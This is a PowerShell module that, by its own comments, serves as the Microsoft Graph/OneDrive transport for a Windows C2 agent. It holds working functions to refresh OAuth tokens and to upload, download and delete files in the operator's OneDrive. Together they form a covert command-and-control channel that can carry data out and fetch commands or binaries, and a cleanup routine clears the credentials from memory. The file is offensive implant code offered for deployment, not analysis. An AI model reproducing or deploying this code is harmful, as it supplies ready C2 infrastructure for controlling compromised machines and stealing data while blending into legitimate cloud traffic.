# === TRANSPORT: Microsoft Graph API (OneDrive) ===
# Provider-specific transport layer for the Windows agent.
# Functions called by agent/core.ps1 (generic C2 layer).
# Credentials are base64 placeholders substituted by the wizard at deploy time.

$script:CLIENT_ID     = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("PLACEHOLDER_CLIENT_ID_B64"))
$script:CLIENT_SECRET = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("PLACEHOLDER_CLIENT_SECRET_B64"))
$script:TENANT_ID     = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("PLACEHOLDER_TENANT_ID_B64"))
$script:REFRESH_TOKEN = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("PLACEHOLDER_REFRESH_TOKEN_B64"))
$script:ACCESS_TOKEN  = ""
$script:GRAPH_BASE    = "https://graph.microsoft.com/v1.0/me/drive/root:"

function _GraphUrl($path, $suffix = ":/content") {
    return "$script:GRAPH_BASE$path$suffix"
}

function Invoke-TransportRefresh {
    Write-Log "[TOKEN]: Refreshing Microsoft Graph access token..."

    $body = @{
        grant_type    = "refresh_token"
        refresh_token = $script:REFRESH_TOKEN
        client_id     = $script:CLIENT_ID
        client_secret = $script:CLIENT_SECRET
        scope         = "Files.ReadWrite.All offline_access"
    }

    try {
        $response = Invoke-RestMethod `
            -Uri "https://login.microsoftonline.com/$script:TENANT_ID/oauth2/v2.0/token" `
            -Method POST -Body $body -ContentType "application/x-www-form-urlencoded"

        if ($response.access_token) {
            $script:ACCESS_TOKEN = $response.access_token
            Write-Log "[TOKEN]: [OK] Token updated (in-memory)"
            return $true
        }
    } catch {
        Write-Log "[TOKEN]: [X] Refresh ERROR: $($_.Exception.Message)"
    }
    return $false
}

function Invoke-TransportUpload {
    param(
        [string]$Path,
        [string]$Content
    )

    $headers   = @{ "Authorization" = "Bearer $script:ACCESS_TOKEN" }
    $bodyBytes = [Text.Encoding]::UTF8.GetBytes($Content)
    $url       = _GraphUrl $Path

    try {
        $response = Invoke-RestMethod -Uri $url -Method PUT -Headers $headers `
            -Body $bodyBytes -ContentType "application/octet-stream"
        return $response
    } catch {
        if ($_.Exception.Message -match "401|InvalidAuthenticationToken|unauthenticated") {
            Write-Log "[API]: Token expired, refreshing..."
            if (Invoke-TransportRefresh) {
                $headers["Authorization"] = "Bearer $script:ACCESS_TOKEN"
                $response = Invoke-RestMethod -Uri $url -Method PUT -Headers $headers `
                    -Body $bodyBytes -ContentType "application/octet-stream"
                return $response
            }
        }
        return $null
    }
}

function Invoke-TransportDownload {
    param([string]$Path)

    $headers = @{ "Authorization" = "Bearer $script:ACCESS_TOKEN" }
    $url     = _GraphUrl $Path

    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bearer $script:ACCESS_TOKEN")
        $responseBytes = $wc.DownloadData($url)
        return [Text.Encoding]::UTF8.GetString($responseBytes)
    } catch [System.Net.WebException] {
        $errMsg = $_.Exception.Message
        $errBody = ""
        if ($_.Exception.Response) {
            try {
                $s = $_.Exception.Response.GetResponseStream()
                $r = New-Object System.IO.StreamReader($s)
                $errBody = $r.ReadToEnd(); $r.Close()
            } catch {}
        }
        if ($errMsg -match "401" -or $errBody -match "InvalidAuthenticationToken|unauthenticated") {
            Write-Log "[API]: Token expired, refreshing..."
            if (Invoke-TransportRefresh) { return (Invoke-TransportDownload -Path $Path) }
        }
        Write-Log "[API]: Download error: $errMsg"
        return $null
    } catch {
        Write-Log "[API]: Download error: $($_.Exception.Message)"
        return $null
    }
}

function Invoke-TransportUploadBinary {
    param(
        [string]$Path,
        [byte[]]$Data
    )

    $headers = @{ "Authorization" = "Bearer $script:ACCESS_TOKEN" }
    $url     = _GraphUrl $Path

    try {
        $response = Invoke-RestMethod -Uri $url -Method PUT -Headers $headers `
            -Body $Data -ContentType "application/octet-stream"
        return $response
    } catch {
        if ($_.Exception.Message -match "401|InvalidAuthenticationToken") {
            if (Invoke-TransportRefresh) {
                $headers["Authorization"] = "Bearer $script:ACCESS_TOKEN"
                $response = Invoke-RestMethod -Uri $url -Method PUT -Headers $headers `
                    -Body $Data -ContentType "application/octet-stream"
                return $response
            }
        }
        return $null
    }
}

function Invoke-TransportDownloadBinary {
    param([string]$Path)

    $url = _GraphUrl $Path

    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bearer $script:ACCESS_TOKEN")
        return $wc.DownloadData($url)
    } catch [System.Net.WebException] {
        if ($_.Exception.Message -match "401|InvalidAuthenticationToken") {
            if (Invoke-TransportRefresh) { return (Invoke-TransportDownloadBinary -Path $Path) }
        }
        return $null
    } catch {
        return $null
    }
}

function Invoke-TransportDelete {
    param([string]$Path)

    $headers = @{ "Authorization" = "Bearer $script:ACCESS_TOKEN" }
    $url     = _GraphUrl $Path ":"

    try {
        Invoke-RestMethod -Uri $url -Method DELETE -Headers $headers `
            -ErrorAction SilentlyContinue | Out-Null
        return $true
    } catch {
        if ($_.Exception.Message -match "401|InvalidAuthenticationToken") {
            if (Invoke-TransportRefresh) {
                $headers["Authorization"] = "Bearer $script:ACCESS_TOKEN"
                Invoke-RestMethod -Uri $url -Method DELETE -Headers $headers `
                    -ErrorAction SilentlyContinue | Out-Null
                return $true
            }
        }
        return $false
    }
}

function Clear-Transport {
    Remove-Variable -Name CLIENT_ID, CLIENT_SECRET, TENANT_ID, REFRESH_TOKEN, ACCESS_TOKEN `
        -Scope Script -Force 2>$null
}
